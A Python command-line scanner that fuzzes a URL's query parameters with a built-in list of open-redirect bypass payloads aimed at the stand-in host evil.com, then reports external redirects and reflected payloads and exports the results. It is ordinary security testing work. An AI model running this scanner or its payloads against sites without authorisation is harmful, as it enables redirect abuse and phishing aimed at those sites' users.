import argparse
import requests
import tldextract
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from tqdm import tqdm
import json
import csv
import time

# list of various payloads to bypass common redirection mechanisms
REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "////evil.com",
    "https://evil.com/redirect",
    "/%2e%2e/%2e%2e/evil.com",
    "evil.com%00",
    "https:@evil.com"
]

# function that determines whether a redirect points to a different website, showing vulnerability is possible
def is_external(domain, loc):
    try:
        origin = tldextract.extract(domain)
        target = tldextract.extract(loc)
        return (target.domain != '' and (origin.domain != target.domain or origin.suffix != target.suffix))
    except Exception:
        return False

# function that attempts to catch and parse through a robots.txt for contextual info
def get_disallowed_paths(url):
    try:
        parsed = urlparse(url)
        robots_url = f"{parsed.scheme}://{parsed.netloc}/robots.txt"
        resp = requests.get(robots_url, timeout=5)
        if resp.status_code == 200:
            lines = resp.text.splitlines()
            disallowed = [line.split(":")[1].strip() for line in lines if line.lower().startswith("disallow")]
            return disallowed
    except Exception:
        pass
    return []

# main fuzzing function that parses and reconstructs urls depending on method and tracks any potential redirect vulnerabilities using previously made functions
def fuzz_redirects(url, payloads, follow_redirects=False, method='GET'):
    parsed = urlparse(url)
    query_params = list(parse_qs(parsed.query).keys())
    if not query_params:
        print("|x| No parameters found in URL.")
        return []

    disallowed = get_disallowed_paths(url)
    domain = parsed.netloc
    findings = []
    rate_limit_count = 0

    print(f"|+| Parameters found: {', '.join(query_params)}")
    time.sleep(0.5)

    for param in tqdm(query_params, desc="Fuzzing parameters", unit="param"):
        for payload in payloads:
            params = parse_qs(parsed.query)
            params[param] = payload
            fuzzed_qs = urlencode(params, doseq=True)

            if method.upper() == 'GET':
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', fuzzed_qs, ''))
                req_url = test_url
                req_data = None
            else:  # POST
                req_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', '', ''))
                req_data = params

            try:
                resp = requests.request(method.upper(), req_url, data=req_data, timeout=6, allow_redirects=follow_redirects)
                status = resp.status_code
                headers = resp.headers
                body = resp.text[:1500]  # limit size to speed up

                if status == 429:
                    rate_limit_count += 1

                loc = headers.get("Location", "")
                result = {
                    "param": param,
                    "payload": payload,
                    "method": method.upper(),
                    "result": None,
                    "redirect_location": None,
                    "context_reflected": False,
                    "robots_disallowed": any(dis in parsed.path for dis in disallowed)
                }

                if (resp.is_redirect or resp.is_permanent_redirect) and is_external(domain, loc):
                    result["result"] = "External Redirect"
                    result["redirect_location"] = loc
                elif payload in body:
                    result["result"] = "Reflected"
                    # Check if reflected in <script>, <a href>, or inside JavaScript
                    if any(tag in body.lower() for tag in [f'<a href="{payload}"', f'location="{payload}"', f'src="{payload}"']):
                        result["context_reflected"] = True
                if result["result"]:
                    findings.append(result)
            except Exception:
                continue

    if rate_limit_count > 3:
        print("\n|!| Multiple 429 responses detected. You may be rate-limited.")

    return findings

# function that handles saving results into either json or csv formats
def save_results(findings, json_out=None, csv_out=None):
    if json_out:
        with open(json_out, 'w') as jf:
            json.dump(findings, jf, indent=2)
        print(f"|+| JSON results saved to {json_out}")

    if csv_out:
        with open(csv_out, 'w', newline='') as cf:
            writer = csv.DictWriter(cf, fieldnames=findings[0].keys())
            writer.writeheader()
            writer.writerows(findings)
        print(f"|+| CSV results saved to {csv_out}")

# arg parser for cli customizability
def cli():
    parser = argparse.ArgumentParser(description="Advanced Open Redirect Scanner with reflection detection, rate-limiting alert, and export options.")
    parser.add_argument("url", help="Target URL with parameters (e.g., http://site.com/page?next=...)")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET", help="HTTP method to use (default: GET)")
    parser.add_argument("--json-output", help="Save results to JSON")
    parser.add_argument("--csv-output", help="Save results to CSV")
    parser.add_argument("--follow-redirects", action="store_true", help="Follow HTTP redirects (default: False)")
    args = parser.parse_args()

    print("|*| Starting open redirect scan...")
    results = fuzz_redirects(args.url, REDIRECT_PAYLOADS, follow_redirects=args.follow_redirects, method=args.method)

    if not results:
        print("|*| No vulnerable parameters found.")
    else:
        print(f"\n|+| {len(results)} findings:")
        for r in results:
            print(f" - [{r['method']}] {r['param']} = {r['payload']} - {r['result']}")

    save_results(results, args.json_output, args.csv_output)

if __name__ == "__main__":
    cli()
